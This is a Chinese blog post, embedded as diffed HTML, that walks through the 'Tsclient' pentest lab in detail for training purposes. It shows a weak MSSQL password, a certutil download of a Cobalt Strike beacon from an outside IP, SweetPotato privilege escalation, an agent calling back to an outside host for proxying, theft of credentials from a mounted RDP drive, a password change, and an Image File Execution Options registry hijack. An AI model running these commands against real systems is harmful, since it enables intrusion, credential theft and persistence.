@@ -1,0 +1,272 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Tsclient | Xur0n 的博客</title><meta name="author" content="Xur0n"><meta name="copyright" content="Xur0n"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#F7F8FA"><meta name="description" content="Tsclient 靶场解题记录，整理代理转发、信息收集、权限提升与域内横向移动的实践过程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tsclient">
+<meta property="og:url" content="https://wangchengxu8661.github.io/posts/33b3a21cd214af87/">
+<meta property="og:site_name" content="Xur0n 的博客">
+<meta property="og:description" content="Tsclient 靶场解题记录，整理代理转发、信息收集、权限提升与域内横向移动的实践过程。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wangchengxu8661.github.io/img/profile-256.webp">
+<meta property="article:published_time" content="2026-03-20T12:26:52.000Z">
+<meta property="article:modified_time" content="2026-03-20T12:26:52.000Z">
+<meta property="article:author" content="Xur0n">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wangchengxu8661.github.io/img/profile-256.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Tsclient",
+  "url": "https://wangchengxu8661.github.io/posts/33b3a21cd214af87/",
+  "image": "https://wangchengxu8661.github.io/img/profile-256.webp",
+  "datePublished": "2026-03-20T12:26:52.000Z",
+  "dateModified": "2026-03-20T12:26:52.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xur0n",
+      "url": "https://wangchengxu8661.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/profile-favicon.png"><link rel="canonical" href="https://wangchengxu8661.github.io/posts/33b3a21cd214af87/"><link rel="preconnect"/><link rel="stylesheet" href="/css/index.css?v=8c636132cb70"><link rel="stylesheet" href="/assets/fontawesome/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.13.0',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Tsclient',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css?v=7382ee52f75e"><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-color: #F7F8FA;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/profile-256.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ctf/"><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/categories/pentest/"><span> 渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/project/"><span> Project</span></a></div><div class="menus_item"><a class="site-page" href="/categories/study/"><span> study</span></a></div><div class="menus_item"><a class="site-page" href="/categories/essay/"><span> Essay</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><span> 工具</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/hero-5e68377666bd.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Xur0n 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">Tsclient</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/ctf/"><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/categories/pentest/"><span> 渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/project/"><span> Project</span></a></div><div class="menus_item"><a class="site-page" href="/categories/study/"><span> study</span></a></div><div class="menus_item"><a class="site-page" href="/categories/essay/"><span> Essay</span></a></div><div class="menus_item"><a class="site-page" href="/tools/"><span> 工具</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Tsclient</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-20T12:26:52.000Z" title="发表于 2026-03-20 20:26:52">2026-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-20T12:26:52.000Z" title="更新于 2026-03-20 20:26:52">2026-03-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentest/">渗透</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。</p>
+<h1 id="Flag01"><a href="#Flag01" class="headerlink" title="Flag01"></a>Flag01</h1><hr>
+<h2 id="msssql弱口令"><a href="#msssql弱口令" class="headerlink" title="msssql弱口令"></a>msssql弱口令</h2><p>使用<code>fscan</code>进行端口扫描，发现存在 mssql弱口令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">28257</span>&gt;E:\fscan\fscan.exe <span class="literal">-h</span> <span class="number">39.98</span>.<span class="number">121.172</span></span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\</span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.98.121.172:1433 open</span></span><br><span class="line"><span class="string">39.98.121.172:80 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 2</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.121.172      code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[+] mssql 39.98.121.172:1433:sa 1qaz!QAZ</span></span><br><span class="line"><span class="string">已完成 2/2</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 9.7446662s</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>MUDT</code>连接，执行命令查看权限。<br><img src="/img/obsidian/dd8a79cf9a662715.png" alt="file-20260320145137643.png" loading='lazy'><br><img src="/img/obsidian/c0630ec9e4015744.png" alt="file-20260320145616631.png" loading='lazy'><br>查看发现当前用户存在 <code>SeImpersonatePrivilege</code> 权限，进行土豆提权。这里用 <code>SweetPotato</code>进行提权</p>
+<h2 id="上线CS土豆提权SeImpersonatePrivilege"><a href="#上线CS土豆提权SeImpersonatePrivilege" class="headerlink" title="上线CS土豆提权SeImpersonatePrivilege"></a>上线<code>CS</code>土豆提权<code>SeImpersonatePrivilege</code></h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载CS后门文件</span><br><span class="line">certutil -f -split -urlcache [http://<span class="number">124</span>.<span class="number">71</span>.<span class="number">111</span>.<span class="number">64</span>/<span class="number">1111</span>.exe ](http://<span class="number">116</span>.<span class="number">62</span>.<span class="number">175</span>.<span class="number">18</span>:<span class="number">80</span>/<span class="number">11111</span>.exe)C:\Users\Public\<span class="number">1111</span>.exe</span><br><span class="line"></span><br><span class="line">运行后门 上线CS</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Public</span>\1111.<span class="title">exe</span></span></span><br></pre></td></tr></table></figure>
+<p>通过<code>CS</code>上传必要工具<img src="/img/obsidian/36569115f493b5a5.png" alt="file-20260320165832974.png" loading='lazy'><br>使用<code>SweetPotato</code>提权<img src="/img/obsidian/b49fc9812130410c.png" alt="file-20260320170815308.png" loading='lazy'><br>开启<code>system</code>权限的<code>CS</code>会话</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell C:\Users\Public\SweetPotato.exe -a C:\Users\Public\beacon_x64.exe</span><br></pre></td></tr></table></figure>
+<p>拿下第一个Flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[03/20 17:17:30] beacon&gt; shell type C:\Users\Administrator\flag\flag01.txt</span><br><span class="line">[03/20 17:17:30] [*] Tasked beacon to run: type C:\Users\Administrator\flag\flag01.txt</span><br><span class="line">[03/20 17:17:31] [+] host called home, sent: 74 bytes</span><br><span class="line">[03/20 17:17:31] [+] received output:</span><br><span class="line"> _________  ________  ________  ___       ___  _______   ________   _________   </span><br><span class="line">|\___   ___\\   ____\|\   ____\|\  \     |\  \|\  ___ \ |\   ___  \|\___   ___\ </span><br><span class="line">\|___ \  \_\ \  \___|\ \  \___|\ \  \    \ \  \ \   __/|\ \  \\ \  \|___ \  \_| </span><br><span class="line">     \ \  \ \ \_____  \ \  \    \ \  \    \ \  \ \  \_|/_\ \  \\ \  \   \ \  \  </span><br><span class="line">      \ \  \ \|____|\  \ \  \____\ \  \____\ \  \ \  \_|\ \ \  \\ \  \   \ \  \ </span><br><span class="line">       \ \__\  ____\_\  \ \_______\ \_______\ \__\ \_______\ \__\\ \__\   \ \__\</span><br><span class="line">        \|__| |\_________\|_______|\|_______|\|__|\|_______|\|__| \|__|    \|__|</span><br><span class="line">              \|_________|                                                      </span><br><span class="line"></span><br><span class="line">Getting flag01 is easy, right?</span><br><span class="line"></span><br><span class="line">flag01: flag&#123;04414e5d-2e5f-480c-a114-55e159a04776&#125;</span><br><span class="line"></span><br><span class="line">Maybe you should focus on user sessions...</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Flag02"><a href="#Flag02" class="headerlink" title="Flag02"></a>Flag02</h1><hr>
+<h2 id="内网代理搭建"><a href="#内网代理搭建" class="headerlink" title="内网代理搭建"></a>内网代理搭建</h2><ol>
+<li>开启控制端<br><code>linux_x64_admin -l 1122</code></li>
+<li>被控端连接控制端<br><code>shell C:\Users\Public\windows_x64_agent.exe -c 116.62.175.18:1122</code></li>
+<li>搭建代理</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line">socks 1123</span><br></pre></td></tr></table></figure>
+
+<h2 id="在线用户进程注入上线"><a href="#在线用户进程注入上线" class="headerlink" title="在线用户进程注入上线"></a>在线用户进程注入上线</h2><ol>
+<li>查看在线用户</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/15eb32f8affd1c96.png" alt="file-20260320172636925.png" loading='lazy'><br>2. 进程注入上线 John用户<img src="/img/obsidian/5fbfce2524ceb6c5.png" alt="file-20260320172959903.png" loading='lazy'><br>3. 查看挂载情况</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/8b50dd1d0cde0373.png" alt="file-20260320173129728.png" loading='lazy'><br>可以看到是挂载了远程 <code>TSCLIENT</code> 用户的C盘，而且正好是靶场的名字</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\TSCLIENT\C</span><br><span class="line">shell type \\TSCLIENT\C\credential.txt</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>扫盘，发现提示</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[03/20 17:36:02] beacon&gt; shell dir \\TSCLIENT\C</span><br><span class="line">[03/20 17:36:02] [*] Tasked beacon to run: dir \\TSCLIENT\C</span><br><span class="line">[03/20 17:36:02] [+] host called home, sent: 47 bytes</span><br><span class="line">[03/20 17:36:04] [+] received output:</span><br><span class="line"> 驱动器 \\TSCLIENT\C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C2C5-9D0C</span><br><span class="line"></span><br><span class="line"> \\TSCLIENT\C 的目录</span><br><span class="line"></span><br><span class="line">2022/07/12  10:34                71 credential.txt</span><br><span class="line">2022/05/12  17:04    &lt;DIR&gt;          PerfLogs</span><br><span class="line">2022/07/11  12:53    &lt;DIR&gt;          Program Files</span><br><span class="line">2022/05/18  11:30    &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">2022/07/11  12:47    &lt;DIR&gt;          Users</span><br><span class="line">2022/07/11  12:45    &lt;DIR&gt;          Windows</span><br><span class="line">               1 个文件             71 字节</span><br><span class="line">               5 个目录 30,033,584,128 可用字节</span><br><span class="line"></span><br><span class="line">[03/20 17:36:30] beacon&gt; shell type \\TSCLIENT\C\credential.txt</span><br><span class="line">[03/20 17:36:30] [*] Tasked beacon to run: type \\TSCLIENT\C\credential.txt</span><br><span class="line">[03/20 17:36:30] [+] host called home, sent: 63 bytes</span><br><span class="line">[03/20 17:36:31] [+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure>
+<p>提示我们需要进行镜像劫持 并给了账号密码</p>
+<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h2><ol>
+<li>使用<code>fscan</code>进行扫描</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan.exe <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">8.18</span>/<span class="number">24</span></span><br><span class="line">fscan.exe <span class="literal">-h</span> <span class="number">172.22</span>.<span class="number">8.18</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.18     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.15     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.31     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.46     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.8.46:445 open</span></span><br><span class="line"><span class="string">172.22.8.31:445 open</span></span><br><span class="line"><span class="string">172.22.8.15:445 open</span></span><br><span class="line"><span class="string">172.22.8.18:1433 open</span></span><br><span class="line"><span class="string">172.22.8.18:445 open</span></span><br><span class="line"><span class="string">172.22.8.15:139 open</span></span><br><span class="line"><span class="string">172.22.8.46:139 open</span></span><br><span class="line"><span class="string">172.22.8.31:139 open</span></span><br><span class="line"><span class="string">172.22.8.46:135 open</span></span><br><span class="line"><span class="string">172.22.8.31:135 open</span></span><br><span class="line"><span class="string">172.22.8.18:139 open</span></span><br><span class="line"><span class="string">172.22.8.15:135 open</span></span><br><span class="line"><span class="string">172.22.8.18:135 open</span></span><br><span class="line"><span class="string">172.22.8.46:80 open</span></span><br><span class="line"><span class="string">172.22.8.18:80 open</span></span><br><span class="line"><span class="string">172.22.8.15:88 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 16</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.31</span></span><br><span class="line"><span class="string">   [-&gt;]WIN19-CLIENT</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.31</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.46</span></span><br><span class="line"><span class="string">   [-&gt;]WIN2016</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.46</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.15</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.15</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.8.18</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-WEB</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.18</span></span><br><span class="line"><span class="string">   [-&gt;]2001:0:14c9:d206:3c48:1f22:d89d:8653</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span></span><br><span class="line"><span class="string">已完成 16/16</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 10.0607634s</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>发现4台主机，整理一下</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">8.18</span> WIN-WEB    已拿下</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.15</span> DC:XIAORANG\DC01</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.31</span> XIAORANG\WIN19-CLIENT</span><br><span class="line"><span class="number">172.22</span>.<span class="number">8.46</span>  WIN2016.xiaorang.lab</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码喷涂修改密码"><a href="#密码喷涂修改密码" class="headerlink" title="密码喷涂修改密码"></a>密码喷涂修改密码</h2><ol>
+<li>密码喷涂一下看看是哪个主机的用户</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q nxc smb 172.22.8.46 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/b446a50e874cb0f4.png" alt="file-20260320182129354.png" loading='lazy'><br>2. 提示密码过期了，需要我们修改一个新的密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbpasswd.py xiaorang.lab/Aldric h:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Admin123$%&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/e2efbff4f7d6b0c2.png" alt="file-20260320185607620.png" loading='lazy'></p>
+<h2 id="RDP远程登录"><a href="#RDP远程登录" class="headerlink" title="RDP远程登录"></a>RDP远程登录</h2><p>用户：<code>xiaorang.lab\Aldrich</code><br>密码：<code>Admin123$%</code><br><img src="/img/obsidian/9f5f3ae5d5f60b07.png" alt="file-20260320190457850.png" loading='lazy'><br>由于该主机不出网，所以要用<code>proxifier</code>进行代理<br>但是经过尝试，发现只有<code>172.22.8.46</code>允许远程桌面连接，因此只能连接该主机</p>
+<h2 id="镜像劫持提权"><a href="#镜像劫持提权" class="headerlink" title="镜像劫持提权"></a>镜像劫持提权</h2><ol>
+<li>获取注册表项 <code>Image File Execution Options</code> 的访问控制列表（ACL）详细信息</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get-acl</span> <span class="literal">-path</span> <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | <span class="built_in">fl</span> *</span><br></pre></td></tr></table></figure>
+<p><img src="/img/obsidian/22a9d28bbfc41c70.png" alt="file-20260320191420418.png" loading='lazy'><br>发现 <code>Authenticated Users</code> 的成员可以修改注册表</p>
+<blockquote>
+<p><strong>Authenticated Users 的成员</strong><br><strong>包括</strong></p>
+<ul>
+<li>所有域用户（Domain Users）。  </li>
+<li>所有本地用户（Local Users）。  </li>
+<li>所有通过身份验证的计算机账户（Computer Accounts）。</li>
+</ul>
+<p><strong>不包括</strong>：</p>
+<ul>
+<li>匿名用户（Anonymous）。</li>
+<li>Guest 账户（除非启用了 Guest 账户并进行了身份验证）。</li>
+</ul>
+</blockquote>
+<ol start="2">
+<li>修改注册表把cmd绑定到放大镜上</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>获取到系统权限的cmd<br>开始菜单-锁定，点出右下角的放大镜<br><img src="/img/obsidian/bacf62db155eb8e7.png" alt="file-20260320193356667.png" loading='lazy'></li>
+<li>生成新的<code>CS</code>后门<br>因为内网主机无法访问公网，因此我们需要使用代理转发，生成新的<code>CS</code>后台，传到<code>C:\Users\Public</code><br><img src="/img/obsidian/b484387373c0a40c.png" alt="file-20260320193238527.png" loading='lazy'></li>
+<li>通过刚刚得到的具有<code>system</code>权限的<code>cmd</code>来运行刚刚上传的<code>CS</code>后门<br><img src="/img/obsidian/b6c1a744331b85c2.png" alt="file-20260320193903934.png" loading='lazy'></li>
+</ol>
+<h2 id="读取flag2"><a href="#读取flag2" class="headerlink" title="读取flag2"></a>读取flag2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type C:\Users\Administrator\flag\flag02.txt</span><br></pre></td></tr></table></figure>
